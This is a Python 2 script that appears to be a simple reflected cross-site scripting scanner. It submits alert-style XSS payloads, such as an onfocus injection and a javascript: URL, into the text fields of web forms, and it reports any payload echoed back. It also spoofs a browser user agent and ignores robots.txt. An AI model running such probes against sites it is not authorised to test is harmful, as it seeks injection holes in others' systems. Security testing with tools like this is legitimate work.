import re 
import os
import mechanize
payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
             '.pdf', '.css', '.js']
xssLinks = []            # TOTAL CROSS SITE SCRIPTING FINDINGS
ResDir = "results/"
op = mechanize.Browser()
op.set_handle_equiv(True)
op.set_handle_gzip(True)
op.set_handle_redirect(True)
op.set_handle_referer(True)
op.set_handle_robots(False)
op.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


def FindText(htmldata, FileName):
    if not os.path.isdir(ResDir):
        os.makedirs(ResDir, 0755)
    pat = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    if pat.match(FileName):
        FileName = re.sub("\.",'', FileName)
    FilePath = "%s/%s.txt" %(ResDir.rstrip('/'),FileName)
    if not os.path.isfile(FilePath):
        open(FilePath, 'a').close()
    
    if htmldata.find('html') or htmldata.find('body') or htmldata.find('title') or htmldata.find('script'):
        TxtInpt = htmldata.findAll('input', {'type':'text'})
        if TxtInpt:
            if TxtInpt != []:
                for line in TxtInpt:
                    f = open(FileName , 'a+')
                    f.write(str(line))
                    f.write("\n\n")
                    f.close()

def TestPayload(payload, p, link):

    op.form[str(p.name)] = payload
    op.submit()
    
    # if payload is found in response, we have XSS
    if payload in op.response().read():
        print ('XSS found!')
        report = 'Link: %s, Payload: %s, Element: %s' % (str(link),payload, str(p.name))
        print report
        xssLinks.append(report)
    op.back()

def FindXSS(link):
    if link:
        blacklisted = False
        y = str(link)
        #print str(link)
        for ext in blacklist:
            if ext in y:
                print '\tNot a good url to test'
                blacklisted = True
                break
        if not blacklisted:
            try:
                op.open(str(link))
                for i in range(len(op.forms())):
                    params = list(op.forms())[i]
                    #op.select_form(nr=i)
                    udomain =  link.rsplit('//')[1].rsplit('/')[0]
                    pdomain = str(params.action).rsplit('//')[1].rsplit('/')[0]
                    #if re.search(udomain, pdomain):
                    for p in params.controls:
                        par = str(p)
                        if 'TextControl' in par:
                            print '\tparam: '+ str(p.name)
                            for item in payloads:
                                op.select_form(nr=i)
                                TestPayload(item, p, link)
            except Exception, e:
                print e